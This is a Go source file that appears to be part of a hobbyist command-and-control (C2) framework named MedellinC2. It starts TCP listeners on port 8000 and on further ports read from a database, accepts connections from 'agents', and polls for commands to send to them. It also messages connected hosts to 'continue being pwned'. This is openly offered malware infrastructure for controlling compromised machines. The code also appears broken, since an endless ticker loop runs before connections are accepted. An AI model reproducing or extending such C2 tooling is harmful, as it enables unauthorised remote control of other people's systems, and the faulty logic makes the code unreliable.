/*
Copyright © 2022 NAME HERE <EMAIL ADDRESS>

*/
package cmd

import (
	"bufio"
	"io"
	"log"
	"net"
	"strings"
	"sync"
	"time"

	"github.com/google/uuid"
	"github.com/megatop1/MedellinC2/data"
	"github.com/spf13/cobra"
)

var logo = `
_____ ______   _______   ________  _______   ___       ___       ___  ________           ________   _______     
|\   _ \  _   \|\  ___ \ |\   ___ \|\  ___ \ |\  \     |\  \     |\  \|\   ___  \        |\   ____\ /  ___  \    
\ \  \\\__\ \  \ \   __/|\ \  \_|\ \ \   __/|\ \  \    \ \  \    \ \  \ \  \\ \  \       \ \  \___|/__/|_/  /|   
 \ \  \\|__| \  \ \  \_|/_\ \  \ \\ \ \  \_|/_\ \  \    \ \  \    \ \  \ \  \\ \  \       \ \  \   |__|//  / /   
  \ \  \    \ \  \ \  \_|\ \ \  \_\\ \ \  \_|\ \ \  \____\ \  \____\ \  \ \  \\ \  \       \ \  \____  /  /_/__  
   \ \__\    \ \__\ \_______\ \_______\ \_______\ \_______\ \_______\ \__\ \__\\ \__\       \ \_______\\________\
    \|__|     \|__|\|_______|\|_______|\|_______|\|_______|\|_______|\|__|\|__| \|__|        \|_______|\|_______|
	`

// startCmd represents the start command
var startCmd = &cobra.Command{
	Use:   "start",
	Short: "Starts the C2 server",
	Long:  `Starts the TCP server to begin listening and handling connections agents`,
	Run: func(cmd *cobra.Command, args []string) {
		//fmt.Println("start called")
		//listenForConnections()
		server()
	},
}

func init() {
	serverCmd.AddCommand(startCmd)
}

//TESTING
var (
	con net.Conn
)

func handleClientRequest(con net.Conn) {
	defer con.Close()

	clientReader := bufio.NewReader(con)

	/* If no duplicate UIDs then generate a new agent */
	if data.CheckDuplicateAgentUUID() == true {
		/*Generate Agent in DB */
		go getAgentInfoAndGenerateAgent()
		/* Check if any commands have been sent to the database */

		/* Issue Commands Remotely */
		/*
			for {
				reader := bufio.NewReader(os.Stdin)
				fmt.Print(">> ")
				text, _ := reader.ReadString('\n')
				fmt.Fprintf(con, text+"\n")

				message, _ := bufio.NewReader(con).ReadString('\n')
				fmt.Print("->: " + message)
				if strings.TrimSpace(string(text)) == "STOP" {
					fmt.Println("TCP client exiting...")
					return
				}
			} */
	}

	for {
		// Waiting for the client request
		clientRequest, err := clientReader.ReadString('\n')
		switch err {
		case nil:
			clientRequest := strings.TrimSpace(clientRequest)
			if clientRequest == ":QUIT" {
				log.Println("agent willingly requested server to close the connection so closing")
				return
			} else {
				//log.Println(clientRequest)	//prints out user input after the new agent outputs "agent successfully connected" to server console
			}
		case io.EOF:
			log.Println("agent died. closed the connection by terminating the process")
			return
		default:
			log.Printf("error: %v\n", err)
			return
		}

		// RESPOND FROM SERVER TO THE CLIENTS (agents)
		/* Send Command to Agent Periodically */
		/*data.AwaitCommands()*/
		t := time.NewTicker(3 * time.Second)
		defer t.Stop()
		for range t.C {
			if _, err = con.Write([]byte("Waiting for commands from C2 server\n")); err != nil {
				log.Printf("failed to respond to client: %v\n", err)
			}
			data.AwaitCommands()
		}
		/* Below does NOT send messages to the client every few seconds like above. Every time agent runs any command, the below message will print */
		if _, err = con.Write([]byte("Successfully Connected to MedellinC2! Please await commands from the C2 server and continue being pwned!\n")); err != nil {
			log.Printf("failed to respond to client: %v\n", err)
		}

	}
}

func server() {
	println(logo)
	/*Start the TCP Server */
	listener, err := net.Listen("tcp", "0.0.0.0:8000") //start TCP server on 8000
	if err != nil {
		log.Fatalln(err)
	}
	defer listener.Close()

	/* Print below message upon successful start of the TCP Server */
	println("Medellin C2 Server Successfully Started on 0.0.0.0:8000")

	/* Print open listeners on startup of C2 server */
	printCurrentListerPorts()

	/* Run continuously in background to keep checking if any new listeners were created */
	for range time.Tick(time.Second * 10) {
		checkListenerPorts()
		data.AwaitCommands()
	}

	/* Using sync.Map to not deal with concurrency slice/map issues */
	var connMap = &sync.Map{}

	/* Accept Connections */
	for {
		con, err := listener.Accept()
		if err != nil {
			log.Println(err)
			continue
		}

		id := uuid.New().String()
		connMap.Store(id, con)

		/* Handle incoming connections by starting goroutine for each connected client */
		go handleClientRequest(con)
	}
}

//Purpose: Successfully checks for all open ports (stored in database)
func checkListenerPorts() {
	//Check all open ports in Listeners table in a loop and allow connections over those ports
	//format GetListenerPorts()
	s := data.GetListenerPorts() //string that contains every port
	v := strings.SplitN(s, ",", len(s))
	//fmt.Print(v)
	//print("current listeners running on ports: ")

	for i := 0; i < len(v); i++ {
		listener2, err := net.Listen("tcp", "0.0.0.0:"+v[i]) //create listener on v[i] (index of the array storing the listener ports)
		if err != nil {
			//log.Fatalln(err)
			continue
		}
		go openPorts(listener2)
	}
	//println("New Listener Started")

}

//Purpose: Will continuously update open ports, when a user creates a new listener, then the port will be opened immediatly
func openPorts(listener net.Listener) {
	for {
		con, err := listener.Accept()
		if err != nil {
			log.Println(err)
		}
		//time.Sleep(time.Second)
		go handleClientRequest(con) //without this, a 2nd connection on the same port can connect but CANNOT run commands on the remote host, hence the go in the beginning
		defer listener.Close()      //close the listener when the application closes
	}
}

func printCurrentListerPorts() {
	s := data.GetListenerPorts() //string that contains every port
	v := strings.SplitN(s, ",", len(s))

	print("Current Listeners Running On Ports: ")
	for i := 0; i < len(v); i++ {
		print(v[i] + " ")
	}
	print("\n")
}

// http://www.inanzzz.com/index.php/post/j3n1/creating-a-concurrent-tcp-client-and-server-example-with-golang
